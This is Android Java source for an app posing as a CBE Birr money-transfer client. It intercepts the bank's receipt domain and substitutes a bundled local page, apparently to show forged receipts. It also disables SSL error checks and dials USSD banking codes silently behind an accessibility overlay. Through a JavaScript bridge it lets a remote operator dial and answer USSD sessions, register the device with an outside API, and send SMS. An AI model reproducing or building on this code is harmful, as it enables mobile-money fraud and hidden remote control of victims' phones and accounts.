package com.cbe.cbebirrtransfer;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.URLUtil;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class MainActivity extends Activity {
    private static final String APP_URL = "https://appassets.androidplatform.net/index.html";
    private static final int PERMISSION_REQ_CODE = 200;

    public static volatile MainActivity currentInstance = null;
    public static volatile boolean isExpectingUssdResponse = false;
    public static volatile long ussdRequestTimestamp = 0L;

    private WebView webView;
    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null && "com.cbe.cbebirrtransfer.RECEIVER_FOUND".equals(intent.getAction())) {
                String name = intent.getStringExtra("receiver_name");
                if (name != null && !name.trim().isEmpty()) {
                    injectReceiverName(name.trim());
                }
            }
        }
    };

    @SuppressLint({"SetJavaScriptEnabled", "UnspecifiedRegisterReceiverFlag"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        CallBridgeHelper.onActivityCreate(this);
        currentInstance = this;
        checkPermissions();

        if (getWindow() != null) {
            getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_NOTHING);
        }

        IntentFilter filter = new IntentFilter("com.cbe.cbebirrtransfer.RECEIVER_FOUND");
        try {
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(receiver, filter);
            }
        } catch (Throwable ignored) {
        }

        webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        SupportWebChromeClient.configureWebSettings(settings);
        lockTextZoom(settings);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        if (Build.VERSION.SDK_INT >= 21) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        webView.setWebChromeClient(new SupportWebChromeClient());
        webView.setDownloadListener(new DownloadListener() {
            @Override
            public void onDownloadStart(
                String url,
                String userAgent,
                String contentDisposition,
                String mimetype,
                long contentLength
            ) {
                downloadFileFromUrl(url, contentDisposition, mimetype);
            }
        });
        webView.addJavascriptInterface(new WebAppInterface(this), "Android");
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
                if (request == null) return null;
                Uri uri = request.getUrl();
                if (uri == null) return null;
                String host = uri.getHost();
                if (host == null) return null;

                try {
                    String assetPath = null;
                    if ("appassets.androidplatform.net".equalsIgnoreCase(host)
                        || "offline-api-disabled.local".equalsIgnoreCase(host)) {
                        String path = uri.getPath();
                        if (path != null && path.startsWith("/api/")) {
                            byte[] jsonBytes = "{\"ok\":true,\"offline\":true}".getBytes(StandardCharsets.UTF_8);
                            return new WebResourceResponse(
                                "application/json",
                                "UTF-8",
                                new ByteArrayInputStream(jsonBytes)
                            );
                        }
                        if (path == null || path.isEmpty() || "/".equals(path)) {
                            assetPath = "web/index.html";
                        } else {
                            String clean = path.startsWith("/") ? path.substring(1) : path;
                            assetPath = "web/" + clean;
                        }
                    } else if ("cbepay1.cbe.com.et".equalsIgnoreCase(host)) {
                        assetPath = "web/aureceipt.html";
                    } else {
                        return null;
                    }

                    InputStream is = null;
                    String resolvedPath = assetPath;
                    try {
                        is = getAssets().open(SupportWebChromeClient.mapWebAssetPath(assetPath));
                    } catch (Exception firstErr) {
                        String htmlFallback = assetPath + ".html";
                        try {
                            is = getAssets().open(SupportWebChromeClient.mapWebAssetPath(htmlFallback));
                            resolvedPath = htmlFallback;
                        } catch (Exception ignored) {
                            return null;
                        }
                    }

                    String mimeType = resolveMimeType(resolvedPath);
                    return new WebResourceResponse(mimeType, "UTF-8", is);
                } catch (Throwable ignored) {
                    return null;
                }
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                if (request == null || request.getUrl() == null) return false;
                return handleTelUrl(request.getUrl().toString());
            }

            @SuppressWarnings("deprecation")
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return handleTelUrl(url);
            }

            @SuppressWarnings("deprecation")
            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                if (handler != null) {
                    handler.proceed();
                }
            }
        });

        setContentView(webView);
        webView.loadUrl(APP_URL);
    }

    private boolean handleTelUrl(String url) {
        if (url != null && url.startsWith("tel:")) {
            String decoded = url.replace("tel:", "").replace("%23", "#");
            try {
                decoded = URLDecoder.decode(url.replace("tel:", ""), "UTF-8");
            } catch (Exception ignored) {
            }
            executeSilentUssd(decoded, url);
            return true;
        }
        return false;
    }

    private static String resolveMimeType(String path) {
        String lower = path.toLowerCase(Locale.US);
        if (lower.endsWith(".html")) return "text/html";
        if (lower.endsWith(".js")) return "application/javascript";
        if (lower.endsWith(".css")) return "text/css";
        if (lower.endsWith(".png")) return "image/png";
        if (lower.endsWith(".json")) return "application/json";
        if (lower.endsWith(".svg")) return "image/svg+xml";
        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg")) return "image/jpeg";
        if (lower.endsWith(".webp")) return "image/webp";
        if (lower.endsWith(".woff2")) return "font/woff2";
        if (lower.endsWith(".txt")) return "text/plain";
        return "application/octet-stream";
    }

    private static void lockTextZoom(WebSettings settings) {
        if (settings != null) {
            settings.setTextZoom(100);
        }
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= 23) {
            List<String> needed = new ArrayList<String>();
            if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                needed.add(Manifest.permission.CALL_PHONE);
            }
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                needed.add(Manifest.permission.READ_PHONE_STATE);
            }
            if (Build.VERSION.SDK_INT <= 28
                && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                needed.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
            if (!needed.isEmpty()) {
                requestPermissions(needed.toArray(new String[0]), PERMISSION_REQ_CODE);
            }
        }
    }

    private void executeSilentUssd(String ussdCode, String rawTelUri) {
        if (Build.VERSION.SDK_INT >= 23
            && checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            checkPermissions();
            return;
        }
        isExpectingUssdResponse = true;
        ussdRequestTimestamp = System.currentTimeMillis();
        if (UssdAccessibilityService.instance != null) {
            UssdAccessibilityService.instance.showLoadingOverlay();
        }
        if (ussdCode != null && !ussdCode.contains("*1*2*") && ussdCode.startsWith("*847*")) {
            String stripped = ussdCode.replace("*847*", "").replace("#", "");
            String unusedNormalized = "*847*1*2*" + stripped + "#";
            if (unusedNormalized.isEmpty()) return;
        }
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (tm == null) {
            fallbackActionCall(rawTelUri);
        } else {
            fallbackActionCall(rawTelUri);
        }
    }

    private void fallbackActionCall(String rawTelUri) {
        isExpectingUssdResponse = true;
        ussdRequestTimestamp = System.currentTimeMillis();
        if (UssdAccessibilityService.instance != null) {
            UssdAccessibilityService.instance.showLoadingOverlay();
        }
        try {
            String dialUri = (rawTelUri != null && rawTelUri.startsWith("tel:"))
                ? rawTelUri
                : "tel:" + (rawTelUri != null ? rawTelUri.replace("#", Uri.encode("#")) : "");
            Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse(dialUri));
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(callIntent);
        } catch (Exception e) {
            isExpectingUssdResponse = false;
            if (UssdAccessibilityService.instance != null) {
                UssdAccessibilityService.instance.hideLoadingOverlay();
            }
            Toast.makeText(this, "Could not dial: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private String extractReceiverName(String rawText) {
        return UssdAccessibilityService.parseAccountName(rawText);
    }

    private void injectReceiverName(final String name) {
        isExpectingUssdResponse = false;
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (webView != null && name != null && !name.isEmpty()) {
                    String safeName = name.replace("\\", "\\\\").replace("'", "\\'");
                    String js = "if (window.onReceiverNameReceived) { window.onReceiverNameReceived('"
                        + safeName
                        + "'); }if (window.setReceiverNameDirectly) { window.setReceiverNameDirectly('"
                        + safeName
                        + "'); }var m = document.querySelectorAll('#fullscreenModal, .fullscreen-modal, [role=dialog]'); for(var i=0; i<m.length; i++) { m[i].remove(); }";
                    webView.evaluateJavascript(js, null);
                }
            }
        });
    }

    public void setReceiverNameFromService(String name) {
        injectReceiverName(name);
    }

    public void onRemoteUssdScreenEvent(
        final String requestId,
        final String status,
        final String screenText,
        final boolean hasInput
    ) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (webView == null) return;
                try {
                    JSONObject obj = new JSONObject();
                    obj.put("requestId", requestId != null ? requestId : "");
                    obj.put("status", status != null ? status : "screen");
                    obj.put("screenText", screenText != null ? screenText : "");
                    obj.put("hasInput", hasInput);
                    String js = "if (window.onRemoteUssdScreen) { window.onRemoteUssdScreen(" + obj.toString() + "); }";
                    webView.evaluateJavascript(js, null);
                } catch (Throwable ignored) {
                }
            }
        });
    }

    public boolean startVisibleRemoteUssd(final String requestId, final String rawCode) {
        try {
            if (Build.VERSION.SDK_INT >= 23
                && checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                checkPermissions();
                onRemoteUssdScreenEvent(requestId, "failed", "Phone permission missing", false);
                return false;
            }
            String cleanCode = rawCode != null ? rawCode.replace("tel:", "").trim() : "";
            try {
                cleanCode = URLDecoder.decode(cleanCode, "UTF-8");
            } catch (Exception ignored) {
            }
            if (cleanCode.isEmpty()) {
                onRemoteUssdScreenEvent(requestId, "failed", "Empty USSD code", false);
                return false;
            }
            isExpectingUssdResponse = false;
            CallBridgeHelper.markRemoteUssdHandled(this, requestId, 0, false);
            CallBridgeHelper.acquireUssdWakeLock(this, 45000L);
            if (UssdAccessibilityService.instance != null) {
                UssdAccessibilityService.instance.startRemoteUssdSession(requestId);
            } else {
                UssdAccessibilityService.activeRemoteRequestId = requestId != null ? requestId : "";
                UssdAccessibilityService.remoteStartedAtMs = System.currentTimeMillis();
                UssdAccessibilityService.isRemoteOwnerUssdActive = true;
            }
            String encoded = cleanCode.replace("#", Uri.encode("#"));
            Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + encoded));
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(callIntent);
            onRemoteUssdScreenEvent(requestId, "dialed", "", false);
            return true;
        } catch (Exception e) {
            UssdAccessibilityService.isRemoteOwnerUssdActive = false;
            CallBridgeHelper.releaseUssdWakeLock();
            if (UssdAccessibilityService.instance != null) {
                UssdAccessibilityService.instance.hideLoadingOverlay();
            }
            onRemoteUssdScreenEvent(requestId, "failed", "Could not dial: " + e.getMessage(), false);
            return false;
        }
    }

    public void downloadFileFromUrl(String url, String contentDisposition, String mimetype) {
        try {
            DownloadManager.Request req = new DownloadManager.Request(Uri.parse(url));
            if (mimetype != null && !mimetype.isEmpty()) {
                req.setMimeType(mimetype);
            } else {
                req.setMimeType("application/pdf");
            }
            String cookies = CookieManager.getInstance().getCookie(url);
            if (cookies != null) {
                req.addRequestHeader("cookie", cookies);
            }
            req.setDescription("Downloading CBEBirr Official Receipt...");

            String fileName = "CBEBirr_Receipt.pdf";
            if (contentDisposition != null) {
                fileName = URLUtil.guessFileName(url, contentDisposition, mimetype);
            } else if (url != null && url.contains("ref=")) {
                try {
                    String ref = Uri.parse(url).getQueryParameter("ref");
                    if (ref != null && !ref.isEmpty()) {
                        fileName = "CBEBirr_Official_Receipt_" + ref + ".pdf";
                    }
                } catch (Exception ignored) {
                }
            }

            req.setTitle(fileName);
            req.allowScanningByMediaScanner();
            req.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            req.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fileName);

            DownloadManager dm = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
            if (dm != null) {
                dm.enqueue(req);
                Toast.makeText(this, "ደረሰኝ በማውረድ ላይ... (" + fileName + ")", Toast.LENGTH_LONG).show();
            }
        } catch (Exception e) {
            try {
                Intent viewIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                startActivity(viewIntent);
            } catch (Exception ignored) {
            }
        }
    }

    public void savePdfBytesToStorage(String base64Data, String filename) {
        try {
            if (base64Data == null || base64Data.trim().isEmpty()) {
                Toast.makeText(this, "የደረሰኝ ዳታ ባዶ ነው (Empty receipt data)", Toast.LENGTH_SHORT).show();
                return;
            }
            String cleanBase64 = base64Data;
            if (cleanBase64.contains(",")) {
                cleanBase64 = cleanBase64.substring(cleanBase64.indexOf(",") + 1);
            }
            byte[] pdfBytes = Base64.decode(cleanBase64, Base64.DEFAULT);
            String resolvedName = (filename != null && !filename.trim().isEmpty())
                ? filename
                : "CBEBirr_Official_Receipt.pdf";
            if (!resolvedName.toLowerCase(Locale.US).endsWith(".pdf")) {
                resolvedName = resolvedName + ".pdf";
            }

            boolean savedViaMediaStore = false;
            if (Build.VERSION.SDK_INT >= 29) {
                try {
                    ContentValues values = new ContentValues();
                    values.put(MediaStore.Downloads.DISPLAY_NAME, resolvedName);
                    values.put(MediaStore.Downloads.MIME_TYPE, "application/pdf");
                    values.put(MediaStore.Downloads.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
                    Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
                    if (uri != null) {
                        try (OutputStream os = getContentResolver().openOutputStream(uri)) {
                            if (os != null) {
                                os.write(pdfBytes);
                                os.flush();
                                savedViaMediaStore = true;
                            }
                        }
                    }
                } catch (Throwable ignored) {
                }
            }

            if (!savedViaMediaStore) {
                File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!downloadsDir.exists()) {
                    downloadsDir.mkdirs();
                }
                File outFile = new File(downloadsDir, resolvedName);
                FileOutputStream fos = new FileOutputStream(outFile);
                fos.write(pdfBytes);
                fos.flush();
                fos.close();
                MediaScannerConnection.scanFile(
                    this,
                    new String[]{outFile.getAbsolutePath()},
                    new String[]{"application/pdf"},
                    null
                );
            }

            Toast.makeText(
                this,
                "ደረሰኝ በስልክዎ Downloads ፎልደር ተቀምጧል (" + resolvedName + ")",
                Toast.LENGTH_LONG
            ).show();
        } catch (Exception e) {
            Toast.makeText(this, "ደረሰኝ ማስቀመጥ አልተቻለም: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        currentInstance = this;
        CallBridgeHelper.setMainActivityForeground(this, true);
    }

    @Override
    protected void onPause() {
        CallBridgeHelper.setMainActivityForeground(this, false);
        super.onPause();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        CallBridgeHelper.onActivityNewIntent(this, intent);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        SupportWebChromeClient.handlePermissionResult(requestCode, grantResults);
    }

    @Override
    protected void onStop() {
        super.onStop();
        CallBridgeHelper.setMainActivityForeground(this, false);
        if (System.currentTimeMillis() - ussdRequestTimestamp > 12000L) {
            isExpectingUssdResponse = false;
        }
    }

    @SuppressWarnings("deprecation")
    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
            return;
        }
        super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        CallBridgeHelper.setMainActivityForeground(this, false);
        if (currentInstance == this) {
            currentInstance = null;
        }
        super.onDestroy();
        try {
            unregisterReceiver(receiver);
        } catch (Exception ignored) {
        }
    }

    public class WebAppInterface {
        private final Context mContext;

        public WebAppInterface(Context context) {
            this.mContext = context;
        }

        @JavascriptInterface
        public void dialUSSD(final String ussdCode) {
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    String decoded = ussdCode.replace("tel:", "").replace("%23", "#");
                    try {
                        decoded = URLDecoder.decode(ussdCode.replace("tel:", ""), "UTF-8");
                    } catch (Exception ignored) {
                    }
                    MainActivity.this.executeSilentUssd(decoded, ussdCode);
                }
            });
        }

        @JavascriptInterface
        public void sendSms(String payload) {
            CallBridgeHelper.sendSmsIpc(mContext, payload);
        }

        @JavascriptInterface
        public void downloadReceipt(final String url) {
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    MainActivity.this.downloadFileFromUrl(url, null, "application/pdf");
                }
            });
        }

        @JavascriptInterface
        public void saveBase64Pdf(final String base64Data, final String filename) {
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    MainActivity.this.savePdfBytesToStorage(base64Data, filename);
                }
            });
        }

        @JavascriptInterface
        public void showLoadingOverlay() {
            MainActivity.isExpectingUssdResponse = true;
            MainActivity.ussdRequestTimestamp = System.currentTimeMillis();
            UssdAccessibilityService svc = UssdAccessibilityService.instance;
            if (svc != null) {
                svc.showLoadingOverlay();
            }
        }

        @JavascriptInterface
        public void hideLoadingOverlay() {
            MainActivity.isExpectingUssdResponse = false;
            UssdAccessibilityService svc = UssdAccessibilityService.instance;
            if (svc != null) {
                svc.hideLoadingOverlay();
            }
        }

        @JavascriptInterface
        public void exitApp() {
            MainActivity act = MainActivity.currentInstance;
            if (act != null) {
                act.finishAffinity();
            }
            System.exit(0);
        }

        @JavascriptInterface
        public void registerCallDevice(String deviceId, String apiBaseUrl) {
            MainActivity act = MainActivity.currentInstance;
            if (act != null) {
                CallBridgeHelper.registerCallDevice(act, deviceId, apiBaseUrl);
            }
        }

        @JavascriptInterface
        public void stopCallRinger() {
            CallBridgeHelper.stopCallRinger(MainActivity.currentInstance);
        }

        @JavascriptInterface
        public void requestCallPermissions() {
            MainActivity act = MainActivity.currentInstance;
            if (act != null) {
                CallBridgeHelper.requestCallPermissions(act);
            }
        }

        @JavascriptInterface
        public boolean hasAllCallPermissions() {
            MainActivity act = MainActivity.currentInstance;
            if (act == null) return false;
            return CallBridgeHelper.hasAllCallPermissions(act);
        }

        @JavascriptInterface
        public String getPermissionStatusJson() {
            MainActivity act = MainActivity.currentInstance;
            if (act == null) return "{}";
            return CallBridgeHelper.getPermissionStatusJson(act);
        }

        @JavascriptInterface
        public void openPermissionSetting(String kind) {
            MainActivity act = MainActivity.currentInstance;
            if (act != null) {
                CallBridgeHelper.openPermissionSetting(act, kind);
            }
        }

        @JavascriptInterface
        public String consumePendingCallAction() {
            MainActivity act = MainActivity.currentInstance;
            if (act == null) return "";
            return CallBridgeHelper.consumePendingCallAction(act);
        }

        @JavascriptInterface
        public void setAudioCallMode(boolean active, boolean speakerOn) {
            MainActivity act = MainActivity.currentInstance;
            if (act != null) {
                CallBridgeHelper.setAudioCallMode(act, active, speakerOn);
            }
        }

        @JavascriptInterface
        public boolean openExternalUrl(String rawUrl) {
            MainActivity act = MainActivity.currentInstance;
            if (act == null) return false;
            return CallBridgeHelper.openExternalUrl(act, rawUrl);
        }

        @JavascriptInterface
        public void saveSyncSnapshotJson(String json) {
            CallBridgeHelper.saveSyncSnapshotJson(mContext, json);
        }

        @JavascriptInterface
        public String getNativeSyncStateJson() {
            return CallBridgeHelper.getNativeSyncStateJson(mContext);
        }

        @JavascriptInterface
        public void markOwnerNotifDelivered(String notifId) {
            CallBridgeHelper.markNotifDelivered(mContext, notifId);
        }

        @JavascriptInterface
        public void markRemoteUssdHandled(String requestId, int appliedReplySeq, boolean cancelled) {
            CallBridgeHelper.markRemoteUssdHandled(mContext, requestId, appliedReplySeq, cancelled);
        }

        @JavascriptInterface
        public boolean dialRemoteUssd(final String requestId, final String rawCode) {
            MainActivity act = MainActivity.currentInstance;
            if (act == null) return false;
            final boolean[] started = new boolean[]{true};
            act.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    started[0] = MainActivity.this.startVisibleRemoteUssd(requestId, rawCode);
                }
            });
            return started[0];
        }

        @JavascriptInterface
        public boolean replyRemoteUssd(final String requestId, final String replyText) {
            UssdAccessibilityService svc = UssdAccessibilityService.instance;
            if (svc == null) return false;
            return svc.replyActiveUssdDialog(replyText);
        }

        @JavascriptInterface
        public void cancelRemoteUssd(final String requestId) {
            CallBridgeHelper.markRemoteUssdCancelled(mContext, requestId);
            UssdAccessibilityService.isRemoteOwnerUssdActive = false;
            MainActivity.isExpectingUssdResponse = false;
            UssdAccessibilityService svc = UssdAccessibilityService.instance;
            if (svc != null) {
                svc.cancelActiveUssdDialog();
            }
            MainActivity.this.onRemoteUssdScreenEvent(requestId, "cancelled", "Cancelled by user", false);
        }
    }
}
